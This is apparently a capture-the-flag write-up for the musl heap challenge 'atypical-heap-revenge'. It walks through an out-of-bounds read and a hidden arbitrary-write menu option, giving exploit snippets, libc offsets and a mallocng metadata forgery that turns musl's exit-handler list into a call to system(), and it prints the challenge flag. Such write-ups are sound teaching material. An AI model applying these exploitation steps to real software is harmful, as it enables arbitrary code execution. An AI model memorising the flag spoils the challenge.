# atypical-heap-revenge

`atypical-heap-revenge` is a musl-based heap challenge with two bugs:

- an out-of-bounds read in `read_note`
- a hidden arbitrary 8-byte write behind menu option `5`

The provided local `flag.txt` is fake. The real remote flag is:

```text
CTF{Y34h_th1s_1s_th3_actu4l_fl4g_n0w_my_b4d_0e13b023f341b48d}
```

## Summary

The exploit has three stages:

1. use the OOB read to leak musl `mallocng` metadata from a neighboring chunk
2. use the hidden arbitrary-write primitive to corrupt allocator bookkeeping and turn the next allocation into a libc leak
3. overwrite musl's exit-handler list so hidden option `6` ends up calling `system("cat flag.txt")`

## Protections

`checksec` on the challenge binary:

```text
Full RELRO
No canary
NX enabled
PIE enabled
```

The bundled runtime is musl, which matters because the final control-flow hijack targets musl's `__cxa_atexit` / `__funcs_on_exit` data structures rather than glibc hooks.

## Source Review

The challenge source is short enough that the two vulnerabilities stand out immediately.

### Bug 1: out-of-bounds read

`NOTE_READ` only checks the requested size against the global maximum, not the size of the selected note:

```c
case NOTE_READ:
    idx = get_idx();

    printf("size: ");
    if (scanf("%u", &sz) != 1)
        errx(1, "invalid input");

    if (sz > MAX_NOTE_SIZE) {
        puts("invalid size");
        break;
    }

    if (notes[idx].data == NULL) {
        puts("note not allocated");
        break;
    }
    write(1, notes[idx].data, sz);
```

So if a note was allocated with size `0xa0`, we can still ask the program to print `0x100` bytes and read `0x60` bytes past the end of the chunk.

### Bug 2: hidden arbitrary write

The menu lies:

```c
void menu(void) {
    puts("1. Allocate note");
    puts("2. Free note");
    puts("3. Write note");
    puts("4. Read note");
    puts("5. Exit");
    printf("> ");
}
```

But in the dispatcher:

```c
#define NOTE_MAGIC 5
#define NOTE_EXIT 6
```

and:

```c
case NOTE_MAGIC:
    if(!magic_used)
        magic_used = 1;

    printf("address: ");
    scanf("%p", &ptr);

    if(((unsigned long)ptr & 7) != 0)
        errx(1, "invalid address");

    printf("value: ");
    scanf("%lu", &value);

    *ptr = value;
    break;
case NOTE_EXIT:
    exit(0);
```

So entering menu choice `5` does not exit. It performs an aligned 8-byte arbitrary write.

The `magic_used` flag is also ineffective: it gets flipped, but never enforced. That means the primitive is not one-shot. We can call it as many times as we want.

## Exploit Plan

We need both a leak and a write target:

- the arbitrary write is enough to modify libc state, but PIE/libc ASLR means we still need an address leak
- the OOB read gives us heap allocator metadata
- that metadata can be abused to get a libc pointer
- once libc is known, musl's exit list is a clean target

## Stage 1: leak `mallocng` metadata

Allocate three notes of size `0xa0` and fill them:

```python
alloc(0, 0xA0)
alloc(1, 0xA0)
alloc(2, 0xA0)
```

Then read note `2` with size `0x100`.

For this challenge, the last 16 leaked bytes of that over-read contain two very useful allocator values:

- at offset `0xf0`: a pointer to musl heap metadata, named `meta` in the exploit
- at offset `0xf8`: a second allocator word, named `hdr2`

In the bundled exploit these offsets are:

```python
LEAK_META_OFF = 0xF0
LEAK_HDR2_OFF = 0xF8
```

On a local run this looks like:

```text
meta = 0x5555...f130
hdr2 = 0x1e00000000000
```

That is enough to start steering musl's allocator.

## Stage 2: turn the next allocation into a libc leak

After leaking `meta`, free note `0` and use the hidden write primitive to splice in a fake allocator record just before the real metadata:

```python
fake = meta - 0x20

magic(fake, meta)
magic(fake + 8, hdr2)
magic(meta + 0x10, fake)
```

The exact field names are musl-internal, but the effect is what matters:

- we create a fake metadata node at `meta - 0x20`
- we seed it with values copied from the genuine metadata
- we patch the real metadata so musl follows our forged node

After that corruption, the next `malloc(0xA0)` no longer behaves like a normal user allocation. Reading from the newly allocated note gives back allocator/bookkeeping data rather than ordinary note contents.

The exploit then extracts a libc pointer from offset `0x28` of that second leak:

```python
group_ptr = u64(leak2[0x28:0x30])
libc_base = group_ptr - 0xA6CD0
```

So we now have a stable libc base even with ASLR enabled.

## Stage 3: hijack musl's exit hooks

This is the cleanest part of the challenge.

musl stores `atexit` handlers in a linked list of nodes. The relevant routine is `__funcs_on_exit`, which effectively does:

1. load `head`
2. use `slot` to pick the most recent function entry
3. call `func(slot_arg)`

Disassembly shows the key layout:

```text
func pointer  = [head + index*8 + 0x8]
func argument = [head + index*8 + 0x108]
```

and `head` plus `slot` live in libc `.bss`.

The bundled exploit uses these offsets:

```python
LIBC_BUILTIN_OFF   = 0xA36A0
LIBC_HEAD_OFF      = 0xA5DC8
LIBC_SLOT_QWORD_OFF = 0xA5FE0
LIBC_SYSTEM_OFF    = 0x48368
```

With the arbitrary write, we forge a one-entry exit-handler list in musl's builtin node:

```python
builtin = libc_base + 0xA36A0
head    = libc_base + 0xA5DC8
slot_qw = libc_base + 0xA5FE0
system  = libc_base + 0x48368
cmd_ptr = group_ptr + 0x10

magic(builtin, 0)              # builtin->next = NULL
magic(builtin + 8, system)     # funcs[0] = system
magic(builtin + 0x108, cmd_ptr)  # args[0] = "cat flag.txt"
magic(head, builtin)           # head = builtin
magic(slot_qw, 1 << 32)        # slot = 1
```

The command string itself is already under our control because note `1` contains:

```python
b"cat flag.txt\\x00"
```

Finally, we trigger the real exit path with hidden menu option `6`.

That makes musl execute:

```c
system("cat flag.txt");
```

instead of a normal exit callback.

## Why this works well

This challenge is nice because each primitive has a clear job:

- OOB read: leaks allocator state
- arbitrary write: mutates libc and heap metadata
- hidden exit: gives a reliable execution point

The exploit never needs a stack pivot, ROP chain, or GOT overwrite. Once libc is known, the exit-handler list is a much simpler target.

## Solver

The helper script in [solve_atypical_heap_revenge.py](./solve_atypical_heap_revenge.py) reproduces the same exploit locally or against the remote service.

Local verification against the bundled files prints the intentionally fake local flag:

```text
CTF{FAKE_FLAG}
```

The actual challenge flag is:

```text
CTF{Y34h_th1s_1s_th3_actu4l_fl4g_n0w_my_b4d_0e13b023f341b48d}
```
